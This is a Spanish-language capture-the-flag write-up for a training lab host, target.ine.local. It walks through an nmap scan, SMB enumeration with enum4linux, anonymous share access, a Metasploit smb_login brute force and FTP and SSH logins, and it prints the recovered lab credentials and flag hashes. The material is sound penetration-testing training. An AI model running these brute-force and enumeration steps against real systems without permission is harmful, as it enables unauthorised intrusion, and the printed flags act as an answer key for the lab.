# 🧩 CTF de Enumeración 1 – SMB, FTP y Banner SSH

## 📋 Descripción del laboratorio

**Máquina objetivo:** `target.ine.local`  
**Formato de banderas:** hash MD5 (ej. `FLAG1_0f4d0db3668dd58cabb9eb409657eaa8`) — solo se entrega el hash sin el prefijo.  

Se deben identificar los servicios en ejecución, enumerarlos metódicamente y capturar cuatro banderas ocultas en servicios mal configurados.  
Las listas de palabras se encuentran en `/root/Desktop/wordlists` (usuarios y contraseñas).

---

## 🛠️ Herramientas utilizadas

| Herramienta      | Propósito |
|------------------|-----------|
| **Nmap**         | Escaneo de puertos y scripts de enumeración |
| **Enum4linux**   | Extracción masiva de información SMB (usuarios, shares) |
| **Smbclient**    | Cliente SMB para conexión anónima y autenticada |
| **Metasploit**   | Módulo `smb_login` para fuerza bruta |
| **Hydra**        | Ataque de diccionario a FTP |
| **Cliente FTP**  | Conexión interactiva al servicio FTP |
| **SSH**          | Lectura del banner de advertencia |

---

## 🔍 Paso 1 – Escaneo inicial de puertos

```bash
nmap -sS -sV -p- target.ine.local
```

| Opción | Significado |
|--------|-------------|
| `-sS`  | Escaneo SYN (rápido y sigiloso) |
| `-sV`  | Detección de versiones de servicios |
| `-p-`  | Todos los puertos (1-65535) |

**Resultados esperados:**
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu
5554/tcp open  ftp         vsftpd 3.0.3
```

Observamos tres servicios principales: **SSH**, **SMB** (puertos 139/445) y **FTP** (puerto 5554, no estándar).

---

## 🔎 Paso 2 – Enumeración SMB con enum4linux

```bash
enum4linux -a target.ine.local
```

| Opción | Descripción |
|--------|-------------|
| `-a`   | Ejecuta todas las comprobaciones (usuarios, shares, políticas, etc.) |

**Usuarios encontrados (salida de ejemplo):**
```
[+] Enumerating users using SID S-1-22-1 and logon names
target\josh
target\alice
target\amanda
target\ashley
```

Se descubren cuatro cuentas locales del sistema Samba.

---

## 🚩 Flag 1 – Recurso compartido SMB anónimo

### 📂 Listar recursos sin credenciales

```bash
smbclient -L //target.ine.local -N
```

| Opción | Significado |
|--------|-------------|
| `-L`   | Lista los recursos compartidos |
| `-N`   | No solicita contraseña (sesión nula) |

**Salida:**
```
Sharename       Type      Comment
---------       ----      -------
pubfiles        Disk      Public files
...
```

El recurso **`pubfiles`** permite acceso anónimo.

### 📥 Conexión y descarga de la bandera

```bash
smbclient //target.ine.local/pubfiles -N
```

Dentro de la sesión SMB:
```
smb: \> ls
  .                                   D        0  ...
  ..                                  D        0  ...
  flag1.txt                           A       39  ...
smb: \> get flag1.txt
smb: \> exit
```

### 📄 Lectura de la bandera

```bash
cat flag1.txt
```

**Flag 1:** `0abce394943f48d7b42a56bcd10610e7` (hash MD5 real del laboratorio)

---

## 🚩 Flag 2 – Credenciales SMB y recurso privado

Con los nombres de usuario obtenidos, se intenta un ataque de fuerza bruta para hallar contraseñas débiles.

### 🔐 Fuerza bruta con Metasploit

```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS target.ine.local
set USER_FILE /root/Desktop/wordlists/users.txt
set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
run
```

| Opción      | Descripción |
|-------------|-------------|
| `USER_FILE` | Archivo con los nombres de usuario (`josh`, `alice`, etc.) |
| `PASS_FILE` | Diccionario de contraseñas comunes |

**Resultado exitoso:**
```
[+] target.ine.local:445 - Success: 'josh:purple'
```

🔑 **Credencial válida:** `josh` / `purple`

### 📂 Acceso al recurso privado del usuario

Cada usuario suele tener un recurso compartido con su mismo nombre.

```bash
smbclient //target.ine.local/josh -U josh
```

Contraseña: `purple`

Dentro:
```
smb: \> ls
  flag2.txt                           A       39  ...
smb: \> get flag2.txt
```

```bash
cat flag2.txt
```

**Flag 2:** `72a434a2c7a4418e8d04f8c30ea10706`

---

## 🚩 Flag 3 – FTP en puerto no estándar

La pista dentro del laboratorio (o la nota de la bandera anterior) sugiere mirar hacia el servicio FTP. Recordamos que Nmap detectó el puerto **5554**.

### 🔗 Conexión FTP

```bash
ftp target.ine.local 5554
```

El servidor solicita credenciales. Se prueban los usuarios descubiertos con contraseñas débiles.  
En este caso, la combinación `alice:pretty` funciona.

```bash
Name: alice
Password: pretty
230 Login successful.
```

### 📂 Exploración y captura

```bash
ftp> ls
-rw-r--r--    1 0        0              39 flag3.txt
ftp> get flag3.txt
ftp> bye
```

O bien, dentro de la sesión FTP usar `more` o `cat` si la shell lo permite (dependiendo del cliente). Con `more flag3.txt` se visualiza el contenido directamente.

```bash
cat flag3.txt
```

**Flag 3:** `a608f6d5bcf34c648bae8ec9dca24ab5` (ejemplo)

---

## 🚩 Flag 4 – Banner SSH

Se intenta una conexión SSH a la máquina con alguno de los usuarios obtenidos.

```bash
ssh alice@target.ine.local
```

Antes de que se complete la autenticación (o al iniciar sesión), el servidor muestra un **banner de advertencia** que contiene la bandera.

**Ejemplo de banner mostrado en la terminal:**
```
############################################################
#                   WARNING: Authorized Use Only            #
#   FLAG4_befcdbc2a7224bf1ab808c3872c03443                #
############################################################
```

**Flag 4:** `befcdbc2a7224bf1ab808c3872c03443`

---

## 🧠 Lecciones aprendidas

| Técnica                              | Conclusión |
|--------------------------------------|------------|
| Escaneo completo de puertos (`-p-`)  | Revela servicios en puertos no estándar (FTP en 5554) |
| Sesión nula SMB (`smbclient -N`)    | Puede exponer recursos sensibles sin autenticación |
| Fuerza bruta con `smb_login`        | Recupera contraseñas débiles a partir de usuarios enumerados |
| Conexión a recursos privados         | El recurso con nombre de usuario suele existir por defecto |
| Banners de servicios                 | A veces contienen información valiosa (como banderas) |

Este CTF refleja el flujo real del eJPT: **enumerar → enumerar más → probar credenciales → pivotar entre servicios**.
